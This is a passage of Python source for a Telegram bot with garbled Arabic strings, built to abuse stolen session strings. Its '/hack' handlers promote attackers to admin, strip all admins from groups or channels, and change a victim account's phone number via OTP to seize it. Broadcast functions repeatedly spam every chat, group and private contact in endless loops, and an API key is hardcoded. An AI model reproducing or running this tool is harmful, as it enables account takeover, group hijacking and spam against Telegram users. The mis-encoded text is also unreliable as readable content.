        return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
      await x.send_message("ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÖÿπÿ±ŸÅ/ÿßŸäÿØŸä ÿßŸÑÿ¨ÿ±Ÿàÿ®/ÿßŸÑŸÇŸÜÿßŸá")
      grp = await x.get_response()
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ÿßŸÑŸÖÿπÿ±ŸÅ")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("ÿ≥ÿßÿ±ŸÅÿπŸÉ ŸÅŸä ÿßŸÑÿ¨ÿ±Ÿàÿ®/ÿßŸÑŸÇŸÜÿßŸáüåö.\n/hack", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÖÿπÿ±ŸÅ/ÿßŸäÿØŸä ÿßŸÑÿ¨ÿ±Ÿàÿ®/ŸÇŸÜÿßŸá")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("ŸÑŸÇÿØ ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿ¨ŸÖŸäÿπ ŸÖÿ¥ÿ±ŸÅŸäŸÜ ÿßŸÑÿ¨ÿ±Ÿàÿ®/ÿßŸÑŸÇŸÜÿßŸá.\n/hack", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
      await x.send_message("ÿßÿπÿ∑ŸÜŸä ÿ±ŸÇŸÖ ÿßŸÑÿ™Ÿä ÿ™ÿ±ŸäÿØ ÿ™ÿ∫Ÿäÿ± ÿßŸÑŸäŸá\n[ŸÖŸÑÿßÿ≠ÿ∏Ÿá /ŸÑÿß ÿ™ÿ≥ÿ™ÿÆÿØŸÖ ÿßÿ±ŸÇÿßŸÖ ÿßŸÑŸàŸáŸÖŸäŸá]\n[ÿßÿ∞ÿß ÿßÿ≥ÿ™ÿÆÿØŸÖÿ™ ÿßŸÑÿßÿ±ŸÇÿßŸÖ ÿßŸÑŸàŸáŸÖŸäŸá ŸÖÿ±ÿßÿ≠ ÿ™ŸÉÿØÿ± ÿ™ÿ≠ÿµŸÑ ÿßŸÑŸÉŸàÿØ] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n ÿßŸÜÿ≥ÿÆ ŸÉŸàÿØ hash ÿ™ÿ®ÿπ ÿ±ŸÇŸÖŸÉ Ÿà ÿ™ÿßŸÉÿØ ŸÖŸÜ ÿßŸÜ ÿ±ŸÇŸÖŸÉ ÿ¨Ÿä ÿπŸÑŸä ŸÉŸàÿØ ÿ™ÿ≥ÿ¨ŸäŸÑ ÿØÿÆŸàŸÑ\nÿßŸÜÿß ÿßÿ™ŸàŸÇŸÅ ŸÑŸÖÿØŸá 20 ÿ´ÿßŸÜŸäŸá ŸÑŸÜÿ≥ÿÆ ŸÉŸàÿØ hash Ÿà ŸÉŸàÿØ ÿ™ÿ≥ÿ¨ŸäŸÑ ÿØÿÆŸàŸÑ")
        await asyncio.sleep(20)
        await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ Ÿáÿßÿ¥")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ÿßŸÑŸÉŸàÿØ")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ™ÿ∫Ÿäÿ± ÿ±ŸÇŸÖ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ®ŸÜÿ¨ÿßÿ≠.\n/hack")
        else:
          await event.respond("ŸáŸÜÿßŸÉ ÿÆÿ∑ÿ£ ŸÖÿß ÿ≠ÿµŸÑ")
      except Exception as e:
        await event.respond("ÿßÿ±ÿ≥ŸÑ ÿßŸÑŸÖÿ¥ŸÉŸÑŸá ÿßŸÑŸâ ŸÑÿ≠ŸÑŸáÿß- @DEV_BABLOO\n**LOGS**\n" + str(e))



@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
async def start(event):
    keyboard = [
      [  
        Button.inline("a", data="a"), 
        Button.inline("b", data="b"),
        Button.inline("c", data="c"),
        ],
      [
        Button.url("‡ºóìåπìè∫ ùñ•ùóàùóã ·Ç¶·•≤Ô∏è·Ç¶·•£·•Ü·•Ü . üí∏ Àº ìå∫", "https://t.me/DEV_BABLOO")
        ]
    ]
    await event.reply("ÿßŸÑÿßŸÜ ÿßÿπÿ∑ŸÜŸä ÿßŸÑÿßŸÖÿ± ÿßŸÑÿ™Ÿä ÿ™ÿ±ŸäÿØ ÿßŸÜ ÿ™ÿ≥ÿ™ÿÆÿØŸÖŸá ŸÑŸÑÿßÿ∞ÿßÿπŸá\n‚ú∞ ŸÑŸÑŸÉŸÑ - ÿßÿÆÿ™ÿ± a\n‚ú∞ ŸÑŸÑÿ¨ÿ±Ÿàÿ®ÿßÿ™ - ÿßÿÆÿ™ÿ± b\n‚ú∞ ŸÑŸÑÿÆÿßÿµ - ÿßÿÆÿ™ÿ± c", buttons=keyboard)



async def gcasta(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for aman in X.iter_dialogs():
                chat = aman.id
                try:
                    await X.send_message(chat, tol, file=file)     
                    if lol != -1001551357238:
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                    elif chat == -1001606996743:
                        pass
                    await asyncio.sleep()
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)        


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ÿßŸÑÿ±ÿ≥ÿßŸÑŸá")
      msg = await x.get_response()
      await x.send_message("ÿßŸÑÿßŸÜ ÿ™ŸÖ ÿ≥Ÿäÿ™ŸÖ ÿßÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßŸÑŸá ÿ®ÿ¥ŸÉŸÑ ÿ™ŸÑŸÇÿßÿ¶Ÿä ŸÉŸÑ 10 ÿØŸÇÿßÿ¶ŸÇ")
      i = await gcasta(strses.text, msg.text)
      await event.reply(f"ÿ™ŸÖ ÿßŸÑÿßÿ∞ÿßÿπŸá {i} ŸÑŸÑŸÉŸÑ üòóüòó.\n/hack", buttons=keyboard)

molb = True

async def gcastb(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for sweetie in X.iter_dialogs():
                if sweetie.is_group:
                    chat = sweetie.id
                    try:
                        if chat != -1001606996743:
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            while molb != False:
                                await asyncio.sleep(600)
                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
                        elif chat == -1001606996743:
                            pass
                    except Exception as e:
                        print(e)
        except Exception as e:
            print(e)


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿπÿ∑Ÿä ÿßŸÑÿ±ÿ≥ÿßŸÑŸá")
      msg = await x.get_response()
      await x.send_message("ÿßŸÑÿßŸÜ ÿ™ŸÖ ÿ≥ŸàŸÅ Ÿäÿ™ŸÖ ÿßÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßŸÑŸá ŸÉŸÑ 10 ÿØŸÇÿßÿ¶ŸÇ ÿ®ÿ¥ŸÉŸÑ ÿ™ŸÑŸÇÿßÿ¶Ÿä")
      i = await gcastb(strses.text, msg.text)
      await event.reply(f"ÿ™ŸÖ ÿßŸÑÿßÿ±ÿ≥ÿßŸÑ ŸÅŸä {i} ÿ¨ÿ±Ÿàÿ® üòóüòó.\n/hack", buttons=keyboard)

async def gcastc(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for krishna in X.iter_dialogs():
                if krishna.is_user and not krishna.entity.bot:
                    chat = krishna.id
                    try:
                        await X.send_message(chat, tol, file=file)
                        while molc != False:
                            await asyncio.sleep(10)
                            await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=20))
                    except BaseException:
                        pass
        except Exception as e:
            print(e)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ŸÑŸÇÿØ ÿ™ŸÖ ÿ∑ÿ±ÿØ Ÿáÿ∞ÿß ÿßŸÑŸÉŸàÿØ ŸÖŸÜ ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÖÿ≥ÿ®ŸÇÿß.\n/hack", buttons=keyboard)
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿπÿ∑ŸÜŸä ÿßŸÑÿ±ÿ≥ÿßŸÑŸá")
      msg = await x.get_response()
      await x.send_message("ÿßŸÑÿßŸÜ ÿ™ŸÖ ÿ≥Ÿäÿ™ŸÖ ÿßÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßŸÑŸá ÿ®ÿ¥ŸÉŸÑ ÿ™ŸÑŸÇÿßÿ¶Ÿä ŸÉŸÑ 10 ÿØŸÇÿßÿ¶ŸÇ")
      i = await gcastc(strses.text, msg.text)
      await event.reply(f"ÿ™ŸÖ ÿßÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßŸÑ ŸÅŸä {i} ÿßŸÑÿÆÿßÿµüòóüòó.\n/hack", buttons=keyboard)

print(" ŸÑŸÇÿØ ÿ™ŸÖ ÿ™ŸÜÿµŸäÿ® ÿßŸÑÿ®Ÿàÿ™ ÿ®ŸÜÿ¨ÿßÿ≠.     ŸÑŸÑŸÖÿ≥ÿßÿπÿØŸá ÿ±ÿßÿ≥ŸÑ ÿßŸÑŸÖÿπÿ±ŸÅ ÿßŸÑÿ™ÿßŸÑŸä. @DEV_BABLOO")
client.run_until_disconnected()
